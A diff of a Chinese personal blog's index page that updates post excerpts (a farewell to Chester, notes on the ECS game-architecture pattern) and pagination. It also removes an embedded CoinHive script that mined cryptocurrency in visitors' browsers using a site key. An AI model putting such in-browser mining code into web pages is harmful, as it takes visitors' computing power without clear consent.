@@ -42,23 +42,6 @@
     </script>
 
 
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-  <!-- CoinHive -->
-  <script>
-    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
-
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-      miner.start();
-    }
-
-    setInterval(function() {
-      // var hashesPerSecond = miner.getHashsePerSecond();
-      var acceptedHashes = miner.getAcceptedHashes();
-      document.getElementById("hashCount").innerHTML = acceptedHashes;
-    }, 1000);
-  </script>
 <link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -129,6 +112,76 @@
 <div class="container">
   <div class="row">
     <div class="col-lg-10 col-md-10 col-md-offset-1">
+      
+        <div class="post-item-wrapper">
+  <a href="/2017/07/22/goodbye-chester/" class="post-title">
+      再见, Chester
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2017-07-22</div>
+      <div class="categories">
+        
+          
+
+<a href="/categories/Life/">Life</a>
+
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo"><div align="center"><br><img src="/images/linkin park.png" alt=""><br></div></div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/music/">music</a> <a class="tag" href="/tags/belief/">belief</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
+      
+        <div class="post-item-wrapper">
+  <a href="/2017/06/17/ecs-quick-notes/" class="post-title">
+      ECS模式学习小结
+  </a>
+  <div class="post-excerpt">
+    <!-- Post Date and Categories -->
+    <div class="date-and-category">
+      <div class="date">2017-06-17</div>
+      <div class="categories">
+        
+          
+
+<a href="/categories/Gamedev/">Gamedev</a>
+
+        
+      </div>
+    </div>
+    <!-- Post Excerpt -->
+    <div class="excerpt typo"><p>今天在研究一些 Game code organization 方面的问题。看到暴雪的 GDC 分享<a href="http://gad.qq.com/article/detail/7212152" target="_blank" rel="noopener">《守望先锋》架构设计与网络同步</a>，于是便顺着稍微深入的了解了一下 ECS 模式，在此做一个简要的记录。</p>
+<h1 id="1-ECS-架构"><a href="#1-ECS-架构" class="headerlink" title="1 ECS 架构"></a>1 ECS 架构</h1><p>译自维基百科：</p>
+<blockquote>
+<p>ECS，即 Entity–component–system 模式，是一个多用于游戏开发的架构模式。ECS 遵循“组合优于继承”的原则，带来了极大的灵活性。每个游戏中的实体 (Entity) 都包含一个或多个组件 (Component)，来添加额外的行为或功能。因此，实体的行为可以在运行时通过添加和移除组件来改变。通常的 ECS 编程方式和数据驱动的设计技巧兼容性极好。</p>
+</blockquote></div>
+    <!-- Post Tags -->
+    <div class="tags">
+      
+        
+
+<a class="tag" href="/tags/gamedev/">gamedev</a> <a class="tag" href="/tags/unity/">unity</a>
+
+
+      
+    </div>
+  </div>
+</div>
+
       
         <div class="post-item-wrapper">
   <a href="/2017/06/10/accept-dynamics/" class="post-title">
@@ -449,32 +502,6 @@
 </div>
 
       
-        <div class="post-item-wrapper">
-  <a href="/2016/09/19/hello-world/" class="post-title">
-      Hello World
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2016-09-19</div>
-      <div class="categories">
-        
-          Uncategorized
-        
-      </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><p>愉快的迁移了博客~</p></div>
-    <!-- Post Tags -->
-    <div class="tags">
-      
-        <div class="untagged">Untagged</div>
-      
-    </div>
-  </div>
-</div>
-
-      
     </div>
   </div>
 </div>
@@ -492,6 +519,13 @@
                 </a>
               </li>
           
+          
+            <li class="next">
+              <a href="/page/3/">
+                <span>NEXT</span>
+                <span class="symbol-right">&gt;</span>
+              </a>
+            </li>
           
       </ul>
     </div>
